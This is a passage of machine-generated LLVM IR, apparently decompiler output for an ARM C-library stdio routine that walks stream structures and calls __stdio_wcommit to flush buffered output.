  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16b20, i32* %r2.global-to-local, align 4
  %v2_16b2c131 = load i32, i32* %v1_16b20, align 4
  store i32 %v2_16b2c131, i32* %r3.global-to-local, align 4
  %v3_16b30133 = icmp uge i32 %v2_16b2c131, %v2_16b20
  store i1 %v3_16b30133, i1* %cpsr_c.global-to-local, align 1
  %v9_16b30139 = icmp eq i32 %v2_16b2c131, %v2_16b20
  br i1 %v9_16b30139, label %dec_label_pc_16b38, label %dec_label_pc_16b50

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b20, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge
  %v0_16b38140 = phi i32 [ %v1_16b30.pre, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ], [ %v2_16b20, %dec_label_pc_16b20 ]
  store i32 %v0_16b38140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b48, label %dec_label_pc_16b4c, label %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge

dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge:  ; preds = %dec_label_pc_16b38
  %v0_16b2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b30.pre = load i32, i32* @r4, align 4
  %v1_16b2c = inttoptr i32 %v0_16b2c.pre to i32*
  %v2_16b2c = load i32, i32* %v1_16b2c, align 4
  store i32 %v2_16b2c, i32* %r3.global-to-local, align 4
  %v3_16b30 = icmp uge i32 %v2_16b2c, %v1_16b30.pre
  store i1 %v3_16b30, i1* %cpsr_c.global-to-local, align 1
  %v9_16b30 = icmp eq i32 %v2_16b2c, %v1_16b30.pre
  br i1 %v9_16b30, label %dec_label_pc_16b38, label %dec_label_pc_16b50

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b38
  %v0_16b4c = load i32, i32* @r4, align 4
  store i32 %v0_16b4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b20, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge, %dec_label_pc_16b4c
  %v0_16b58 = phi i32 [ %v0_16b4c, %dec_label_pc_16b4c ], [ %v2_16b2c131, %dec_label_pc_16b20 ], [ %v2_16b2c, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ]
  %v1_16b50 = phi i32 [ %v0_16b4c, %dec_label_pc_16b4c ], [ %v2_16b20, %dec_label_pc_16b20 ], [ %v1_16b30.pre, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ]
  %v3_16b50 = icmp uge i32 %v0_16b58, %v1_16b50
  store i1 %v3_16b50, i1* %cpsr_c.global-to-local, align 1
  %v9_16b50 = icmp eq i32 %v0_16b58, %v1_16b50
  br i1 %v9_16b50, label %dec_label_pc_16b58, label %dec_label_pc_16b50.dec_label_pc_16b20_crit_edge

dec_label_pc_16b50.dec_label_pc_16b20_crit_edge:  ; preds = %dec_label_pc_16b50
  %v0_16b20.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b50
  %v2_16b58 = icmp ne i32 %v1_16b50, 0
  store i1 %v2_16b58, i1* %cpsr_c.global-to-local, align 1
  %v7_16b5c = icmp slt i32 %v1_16b50, 2
  br i1 %v7_16b5c, label %dec_label_pc_16b78, label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16b58
  %v0_16b60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16b60, i32* %r0.global-to-local, align 4
  %v0_16b64 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b64 = add i32 %v0_16b64, 129
  store i32 %v1_16b64, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16af0, %dec_label_pc_16b60, %dec_label_pc_16b58
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16b7c = load i32, i32* @r6, align 4
  %v2_16b7c = add i32 %v0_16b7c, 152
  %v3_16b7c = inttoptr i32 %v2_16b7c to i32*
  %v4_16b7c = load i32, i32* %v3_16b7c, align 4
  store i32 %v4_16b7c, i32* %r5.global-to-local, align 4
  %v1_16b80 = add i32 %v4_16b7c, 8
  %v2_16b80 = inttoptr i32 %v1_16b80 to i32*
  %v3_16b80 = load i32, i32* %v2_16b80, align 4
  store i32 %v3_16b80, i32* %r3.global-to-local, align 4
  %v1_16b84 = load i32, i32* %r8.global-to-local, align 4
  %v3_16b84 = icmp uge i32 %v3_16b80, %v1_16b84
  store i1 %v3_16b84, i1* %cpsr_c.global-to-local, align 1
  %v9_16b84 = icmp eq i32 %v3_16b80, %v1_16b84
  br i1 %v9_16b84, label %dec_label_pc_16bcc, label %dec_label_pc_16b8c

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b78
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16b7c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16b98123 = inttoptr i32 %v4_16b7c to i32*
  %v2_16b98124 = load i32, i32* %v1_16b98123, align 4
  store i32 %v2_16b98124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16b9c126 = icmp eq i32 %v2_16b98124, 0
  br i1 %v9_16b9c126, label %dec_label_pc_16ba4, label %dec_label_pc_16bbc

dec_label_pc_16ba4:                               ; preds = %dec_label_pc_16b8c, %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge
  %v0_16ba4127 = phi i32 [ %v1_16b9c.pre, %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge ], [ 0, %dec_label_pc_16b8c ]
  store i32 %v0_16ba4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16bb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16bb4, label %dec_label_pc_16bb8, label %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge

dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge:  ; preds = %dec_label_pc_16ba4
  %v0_16b98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b9c.pre = load i32, i32* @r4, align 4
  %v1_16b98 = inttoptr i32 %v0_16b98.pre to i32*
  %v2_16b98 = load i32, i32* %v1_16b98, align 4
  store i32 %v2_16b98, i32* %r3.global-to-local, align 4
  %v3_16b9c = icmp uge i32 %v2_16b98, %v1_16b9c.pre
  store i1 %v3_16b9c, i1* %cpsr_c.global-to-local, align 1
  %v9_16b9c = icmp eq i32 %v2_16b98, %v1_16b9c.pre
  br i1 %v9_16b9c, label %dec_label_pc_16ba4, label %dec_label_pc_16bbc

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16ba4
  %v0_16bb8 = load i32, i32* @r4, align 4
  store i32 %v0_16bb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16bbc

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b8c, %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge, %dec_label_pc_16bb8
  %v0_16bbc = phi i32 [ %v0_16bb8, %dec_label_pc_16bb8 ], [ %v2_16b98124, %dec_label_pc_16b8c ], [ %v2_16b98, %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge ]
  %v1_16bbc = phi i32 [ %v0_16bb8, %dec_label_pc_16bb8 ], [ 0, %dec_label_pc_16b8c ], [ %v1_16b9c.pre, %dec_label_pc_16ba4.dec_label_pc_16b98_crit_edge ]
  %v3_16bbc = icmp uge i32 %v0_16bbc, %v1_16bbc
  store i1 %v3_16bbc, i1* %cpsr_c.global-to-local, align 1
  %v9_16bbc = icmp eq i32 %v0_16bbc, %v1_16bbc
  br i1 %v9_16bbc, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16bbc
  %v1_16bc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16bc0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16bbc, %bb67
  %v1_16bc4 = xor i1 %v9_16bbc, true
  call void @__pseudo_cond_branch(i1 %v1_16bc4, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_16bc8 = load i32, i32* %r8.global-to-local, align 4
  %v1_16bc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16bc8 = add i32 %v1_16bc8, 8
  %v3_16bc8 = inttoptr i32 %v2_16bc8 to i32*
  store i32 %v0_16bc8, i32* %v3_16bc8, align 4
  %v0_16bd0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16bcc

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16b78, %bb68
  %v0_16bdc = phi i32 [ %v0_16b7c, %dec_label_pc_16b78 ], [ %v0_16bd0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16bd0 = add i32 %v0_16bdc, 152
  %v3_16bd0 = inttoptr i32 %v2_16bd0 to i32*
  %v4_16bd0 = load i32, i32* %v3_16bd0, align 4
  store i32 %v4_16bd0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16bd8 = add i32 %v4_16bd0, 4
  %v2_16bd8 = inttoptr i32 %v1_16bd8 to i32*
  %v3_16bd8 = load i32, i32* %v2_16bd8, align 4
  store i32 %v3_16bd8, i32* %r1.global-to-local, align 4
  %v2_16bdc = add i32 %v0_16bdc, 76
  %v3_16bdc = inttoptr i32 %v2_16bdc to i32*
  %v4_16bdc = load i32, i32* %v3_16bdc, align 4
  store i32 %v4_16bdc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16be0 = icmp eq i32 %v3_16bd8, 0
  %v1_16be4 = inttoptr i32 %v4_16bdc to i32*
  %v2_16be4 = load i32, i32* %v1_16be4, align 4
  store i32 %v2_16be4, i32* @r5, align 4
  br i1 %v2_16be0, label %dec_label_pc_16bec, label %dec_label_pc_16c4c

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bcc
  %v2_16bec = add i32 %v4_16bd0, 8
  %v3_16bec = inttoptr i32 %v2_16bec to i32*
  store i32 0, i32* %v3_16bec, align 4
  %v0_16bf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16bf0, i32* @r7, align 4
  br label %dec_label_pc_16bf4

dec_label_pc_16bf4:                               ; preds = %dec_label_pc_16c24.dec_label_pc_16bf4_crit_edge, %dec_label_pc_16bec
  %v0_16bf4 = phi i32 [ %v0_16bf4.pre, %dec_label_pc_16c24.dec_label_pc_16bf4_crit_edge ], [ %v0_16bf0, %dec_label_pc_16bec ]
  %v1_16bf4 = inttoptr i32 %v0_16bf4 to i32*
  %v2_16bf4 = load i32, i32* %v1_16bf4, align 4
  store i32 %v2_16bf4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16bf4, i32* %r2.global-to-local, align 4
  %v2_16c00111 = load i32, i32* %v1_16bf4, align 4
  store i32 %v2_16c00111, i32* %r3.global-to-local, align 4
  %v3_16c04113 = icmp uge i32 %v2_16c00111, %v2_16bf4
  store i1 %v3_16c04113, i1* %cpsr_c.global-to-local, align 1
  %v9_16c04119 = icmp eq i32 %v2_16c00111, %v2_16bf4
  br i1 %v9_16c04119, label %dec_label_pc_16c0c, label %dec_label_pc_16c24

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16bf4, %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge
  %v0_16c0c120 = phi i32 [ %v1_16c04.pre, %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge ], [ %v2_16bf4, %dec_label_pc_16bf4 ]
  store i32 %v0_16c0c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c1c, label %dec_label_pc_16c20, label %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge

dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge:  ; preds = %dec_label_pc_16c0c
  %v0_16c00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c04.pre = load i32, i32* @r4, align 4
  %v1_16c00 = inttoptr i32 %v0_16c00.pre to i32*
  %v2_16c00 = load i32, i32* %v1_16c00, align 4
  store i32 %v2_16c00, i32* %r3.global-to-local, align 4
  %v3_16c04 = icmp uge i32 %v2_16c00, %v1_16c04.pre
  store i1 %v3_16c04, i1* %cpsr_c.global-to-local, align 1
  %v9_16c04 = icmp eq i32 %v2_16c00, %v1_16c04.pre
  br i1 %v9_16c04, label %dec_label_pc_16c0c, label %dec_label_pc_16c24

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16c0c
  %v0_16c20 = load i32, i32* @r4, align 4
  store i32 %v0_16c20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c24

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16bf4, %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge, %dec_label_pc_16c20
  %v0_16c2c = phi i32 [ %v0_16c20, %dec_label_pc_16c20 ], [ %v2_16c00111, %dec_label_pc_16bf4 ], [ %v2_16c00, %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge ]
  %v1_16c24 = phi i32 [ %v0_16c20, %dec_label_pc_16c20 ], [ %v2_16bf4, %dec_label_pc_16bf4 ], [ %v1_16c04.pre, %dec_label_pc_16c0c.dec_label_pc_16c00_crit_edge ]
  %v3_16c24 = icmp uge i32 %v0_16c2c, %v1_16c24
  store i1 %v3_16c24, i1* %cpsr_c.global-to-local, align 1
  %v9_16c24 = icmp eq i32 %v0_16c2c, %v1_16c24
  br i1 %v9_16c24, label %dec_label_pc_16c2c, label %dec_label_pc_16c24.dec_label_pc_16bf4_crit_edge

dec_label_pc_16c24.dec_label_pc_16bf4_crit_edge:  ; preds = %dec_label_pc_16c24
  %v0_16bf4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16bf4

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16c24
  %v2_16c2c = icmp ne i32 %v1_16c24, 0
  store i1 %v2_16c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_16c30 = icmp slt i32 %v1_16c24, 2
  br i1 %v7_16c30, label %dec_label_pc_16c4cthread-pre-split, label %dec_label_pc_16c34

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c2c
  %v0_16c34 = load i32, i32* @r7, align 4
  store i32 %v0_16c34, i32* %r0.global-to-local, align 4
  %v0_16c38 = load i32, i32* %r1.global-to-local, align 4
  %v1_16c38 = add i32 %v0_16c38, 129
  store i32 %v1_16c38, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c4cthread-pre-split

dec_label_pc_16c4cthread-pre-split:               ; preds = %dec_label_pc_16c2c, %dec_label_pc_16c34
  %v0_16d98.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c4cthread-pre-split, %dec_label_pc_16bcc
  %v0_16d98.pr = phi i32 [ %v0_16d98.pr.pr, %dec_label_pc_16c4cthread-pre-split ], [ %v2_16be4, %dec_label_pc_16bcc ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d9818 = icmp eq i32 %v0_16d98.pr, 0
  br i1 %v2_16d9818, label %dec_label_pc_16da0, label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c4c, %dec_label_pc_16d94
  %v0_16c84 = phi i32 [ %v3_16d94, %dec_label_pc_16d94 ], [ %v0_16d98.pr, %dec_label_pc_16c4c ]
  %v1_16c5c = inttoptr i32 %v0_16c84 to i16*
  %v2_16c5c = load i16, i16* %v1_16c5c, align 2
  %v3_16c5c = zext i16 %v2_16c5c to i32
  store i32 %v3_16c5c, i32* %r3.global-to-local, align 4
  %v1_16c60 = and i32 %v3_16c5c, 64
  %v2_16c60 = icmp eq i32 %v1_16c60, 0
  br i1 %v2_16c60, label %dec_label_pc_16d94, label %dec_label_pc_16c68

dec_label_pc_16c68:                               ; preds = %dec_label_pc_16c5c
  %v0_16c68 = load i32, i32* @r6, align 4
  %v1_16c68 = load i32, i32* %sb.global-to-local, align 4
  %v2_16c68 = add i32 %v1_16c68, %v0_16c68
  %v3_16c68 = inttoptr i32 %v2_16c68 to i32*
  %v4_16c68 = load i32, i32* %v3_16c68, align 4
  store i32 %v4_16c68, i32* %r3.global-to-local, align 4
  %v1_16c6c = inttoptr i32 %v4_16c68 to i32*
  %v2_16c6c = load i32, i32* %v1_16c6c, align 4
  store i32 %v2_16c6c, i32* %r3.global-to-local, align 4
  %v2_16c70 = icmp ugt i32 %v2_16c6c, 1
  store i1 %v2_16c70, i1* %cpsr_c.global-to-local, align 1
  %v7_16c70 = icmp eq i32 %v2_16c6c, 2
  br i1 %v7_16c70, label %dec_label_pc_16cd4, label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c68
  %v1_16c78 = add i32 %v0_16c84, 64
  %v2_16c78 = inttoptr i32 %v1_16c78 to i32*
  %v3_16c78 = load i32, i32* %v2_16c78, align 4
  store i32 %v3_16c78, i32* %r3.global-to-local, align 4
  %v1_16c7c = load i32, i32* %r8.global-to-local, align 4
  %v3_16c7c = icmp uge i32 %v3_16c78, %v1_16c7c
  store i1 %v3_16c7c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c7c = icmp eq i32 %v3_16c78, %v1_16c7c
  br i1 %v9_16c7c, label %dec_label_pc_16cc8, label %dec_label_pc_16c84

dec_label_pc_16c84:                               ; preds = %dec_label_pc_16c78
  %v1_16c84 = add i32 %v0_16c84, 56
  store i32 %v1_16c84, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16c84, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16c9486 = inttoptr i32 %v1_16c84 to i32*
  %v2_16c9487 = load i32, i32* %v1_16c9486, align 4
  store i32 %v2_16c9487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16c9894 = icmp eq i32 %v2_16c9487, 0
  br i1 %v9_16c9894, label %dec_label_pc_16ca0, label %dec_label_pc_16cb8

dec_label_pc_16ca0:                               ; preds = %dec_label_pc_16c84, %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge
  %v0_16ca095 = phi i32 [ %v1_16c98.pre, %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge ], [ 0, %dec_label_pc_16c84 ]
  store i32 %v0_16ca095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16cb0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16cb0, label %dec_label_pc_16cb4, label %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge

dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge:  ; preds = %dec_label_pc_16ca0
  %v0_16c94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c98.pre = load i32, i32* @r4, align 4
  %v1_16c94 = inttoptr i32 %v0_16c94.pre to i32*
  %v2_16c94 = load i32, i32* %v1_16c94, align 4
  store i32 %v2_16c94, i32* %r3.global-to-local, align 4
  %v3_16c98 = icmp uge i32 %v2_16c94, %v1_16c98.pre
  store i1 %v3_16c98, i1* %cpsr_c.global-to-local, align 1
  %v9_16c98 = icmp eq i32 %v2_16c94, %v1_16c98.pre
  br i1 %v9_16c98, label %dec_label_pc_16ca0, label %dec_label_pc_16cb8

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16ca0
  %v0_16cb4 = load i32, i32* @r4, align 4
  store i32 %v0_16cb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16c84, %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge, %dec_label_pc_16cb4
  %v0_16cb8 = phi i32 [ %v0_16cb4, %dec_label_pc_16cb4 ], [ %v2_16c9487, %dec_label_pc_16c84 ], [ %v2_16c94, %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge ]
  %v1_16cb8 = phi i32 [ %v0_16cb4, %dec_label_pc_16cb4 ], [ 0, %dec_label_pc_16c84 ], [ %v1_16c98.pre, %dec_label_pc_16ca0.dec_label_pc_16c94_crit_edge ]
  %v3_16cb8 = icmp uge i32 %v0_16cb8, %v1_16cb8
  store i1 %v3_16cb8, i1* %cpsr_c.global-to-local, align 1
  %v9_16cb8 = icmp eq i32 %v0_16cb8, %v1_16cb8
  br i1 %v9_16cb8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16cb8
  %v1_16cbc = load i32, i32* @r7, align 4
  store i32 %v1_16cbc, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16cb8, %bb69
  %v1_16cc0 = xor i1 %v9_16cb8, true
  call void @__pseudo_cond_branch(i1 %v1_16cc0, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_16cc4 = load i32, i32* %r8.global-to-local, align 4
  %v1_16cc4 = load i32, i32* @r5, align 4
  %v2_16cc4 = add i32 %v1_16cc4, 64
  %v3_16cc4 = inttoptr i32 %v2_16cc4 to i32*
  store i32 %v0_16cc4, i32* %v3_16cc4, align 4
  %v0_16cc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16c78, %bb70
  %v0_16cc8 = phi i32 [ %v0_16c84, %dec_label_pc_16c78 ], [ %v0_16cc8.pre, %bb70 ]
  %v1_16cc8 = add i32 %v0_16cc8, 60
  %v2_16cc8 = inttoptr i32 %v1_16cc8 to i32*
  %v3_16cc8 = load i32, i32* %v2_16cc8, align 4
  %v1_16ccc = add i32 %v3_16cc8, 1
  store i32 %v1_16ccc, i32* %r3.global-to-local, align 4
  store i32 %v1_16ccc, i32* %v2_16cc8, align 4
  %v0_16cd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16c68, %dec_label_pc_16cc8
  %v0_16cec = phi i32 [ %v0_16c84, %dec_label_pc_16c68 ], [ %v0_16cd4.pre, %dec_label_pc_16cc8 ]
  %v1_16cd4 = inttoptr i32 %v0_16cec to i16*
  %v2_16cd4 = load i16, i16* %v1_16cd4, align 2
  %v3_16cd4 = zext i16 %v2_16cd4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_16cdc = or i32 %v3_16cd4, %stack_var_-44.1
  %v1_16ce0 = xor i32 %v2_16cdc, 320
  store i32 %v1_16ce0, i32* %r3.global-to-local, align 4
  %v1_16ce4 = and i32 %v1_16ce0, 832
  %v2_16ce4 = icmp eq i32 %v1_16ce4, 0
  br i1 %v2_16ce4, label %dec_label_pc_16cec, label %bb71

dec_label_pc_16cec:                               ; preds = %dec_label_pc_16cd4
  store i32 %v0_16cec, i32* %r0.global-to-local, align 4
  %v1_16cf0 = call i32 @__stdio_wcommit(i32 %v0_16cec)
  store i32 %v1_16cf0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cf4 = icmp eq i32 %v1_16cf0, 0
  br i1 %v2_16cf4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_16cec
  %v1_16cf8 = load i32, i32* @r5, align 4
  %v2_16cf8 = inttoptr i32 %v1_16cf8 to i16*
  %v3_16cf8 = load i16, i16* %v2_16cf8, align 2
  %v4_16cf8 = zext i16 %v3_16cf8 to i32
  store i32 %v4_16cf8, i32* %r3.global-to-local, align 4
  %v2_16cfc = add i32 %v1_16cf8, 8
  %v3_16cfc = inttoptr i32 %v2_16cfc to i32*
  %v4_16cfc = load i32, i32* %v3_16cfc, align 4
  store i32 %v4_16cfc, i32* %r2.global-to-local, align 4
  %v2_16d00 = and i32 %v4_16cf8, 65471
  store i32 %v2_16d00, i32* %r3.global-to-local, align 4
  %v3_16d04 = add i32 %v1_16cf8, 28
  %v4_16d04 = inttoptr i32 %v3_16d04 to i32*
  store i32 %v4_16cfc, i32* %v4_16d04, align 4
  %v1_16d08 = load i32, i32* %r3.global-to-local, align 4
  %v2_16d08 = trunc i32 %v1_16d08 to i16
  %v3_16d08 = load i32, i32* @r5, align 4
  %v4_16d08 = inttoptr i32 %v3_16d08 to i16*
  store i16 %v2_16d08, i16* %v4_16d08, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_16cec
  %v1_16d0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_16d0c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16cd4, %.thread7
  %v0_16d10 = load i32, i32* @r6, align 4
  %v1_16d10 = load i32, i32* %sb.global-to-local, align 4
  %v2_16d10 = add i32 %v1_16d10, %v0_16d10
  %v3_16d10 = inttoptr i32 %v2_16d10 to i32*
  %v4_16d10 = load i32, i32* %v3_16d10, align 4
  store i32 %v4_16d10, i32* %r3.global-to-local, align 4
  %v1_16d14 = inttoptr i32 %v4_16d10 to i32*
  %v2_16d14 = load i32, i32* %v1_16d14, align 4
  store i32 %v2_16d14, i32* %r3.global-to-local, align 4
  %v2_16d18 = icmp ugt i32 %v2_16d14, 1
  store i1 %v2_16d18, i1* %cpsr_c.global-to-local, align 1
  %v7_16d18 = icmp eq i32 %v2_16d14, 2
  br i1 %v7_16d18, label %dec_label_pc_16d94, label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %bb71
  %v0_16d20 = load i32, i32* @r5, align 4
  %v1_16d20 = add i32 %v0_16d20, 60
  %v2_16d20 = inttoptr i32 %v1_16d20 to i32*
  %v3_16d20 = load i32, i32* %v2_16d20, align 4
  %v1_16d24 = add i32 %v3_16d20, -1
  store i32 %v1_16d24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d28 = icmp eq i32 %v1_16d24, 0
  store i32 %v1_16d24, i32* %v2_16d20, align 4
  br i1 %v2_16d28, label %dec_label_pc_16d34, label %dec_label_pc_16d94

dec_label_pc_16d34:                               ; preds = %dec_label_pc_16d20
  %v0_16d34 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d34 = load i32, i32* @r5, align 4
  %v2_16d34 = add i32 %v1_16d34, 64
  %v3_16d34 = inttoptr i32 %v2_16d34 to i32*
  store i32 %v0_16d34, i32* %v3_16d34, align 4
  %v0_16d38 = load i32, i32* @r5, align 4
  %v1_16d38 = add i32 %v0_16d38, 56
  store i32 %v1_16d38, i32* @r7, align 4
  br label %dec_label_pc_16d3c

dec_label_pc_16d3c:                               ; preds = %dec_label_pc_16d6c.dec_label_pc_16d3c_crit_edge, %dec_label_pc_16d34
  %v0_16d44 = phi i32 [ %v0_16d44.pre, %dec_label_pc_16d6c.dec_label_pc_16d3c_crit_edge ], [ %v1_16d38, %dec_label_pc_16d34 ]
  %v0_16d3c = phi i32 [ %v0_16d3c.pre, %dec_label_pc_16d6c.dec_label_pc_16d3c_crit_edge ], [ %v0_16d38, %dec_label_pc_16d34 ]
  %v1_16d3c = add i32 %v0_16d3c, 56
  %v2_16d3c = inttoptr i32 %v1_16d3c to i32*
  %v3_16d3c = load i32, i32* %v2_16d3c, align 4
  store i32 %v3_16d3c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d44, i32* %r2.global-to-local, align 4
  %v1_16d4897 = inttoptr i32 %v0_16d44 to i32*
  %v2_16d4898 = load i32, i32* %v1_16d4897, align 4
  store i32 %v2_16d4898, i32* %r3.global-to-local, align 4
  %v3_16d4c100 = icmp uge i32 %v2_16d4898, %v3_16d3c
  store i1 %v3_16d4c100, i1* %cpsr_c.global-to-local, align 1
  %v9_16d4c106 = icmp eq i32 %v2_16d4898, %v3_16d3c
  br i1 %v9_16d4c106, label %dec_label_pc_16d54, label %dec_label_pc_16d6c

dec_label_pc_16d54:                               ; preds = %dec_label_pc_16d3c, %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge
  %v0_16d54107 = phi i32 [ %v1_16d4c.pre, %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge ], [ %v3_16d3c, %dec_label_pc_16d3c ]
  store i32 %v0_16d54107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d64 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d64, label %dec_label_pc_16d68, label %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge

dec_label_pc_16d54.dec_label_pc_16d48_crit_edge:  ; preds = %dec_label_pc_16d54
  %v0_16d48.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d4c.pre = load i32, i32* @r4, align 4
  %v1_16d48 = inttoptr i32 %v0_16d48.pre to i32*
  %v2_16d48 = load i32, i32* %v1_16d48, align 4
  store i32 %v2_16d48, i32* %r3.global-to-local, align 4
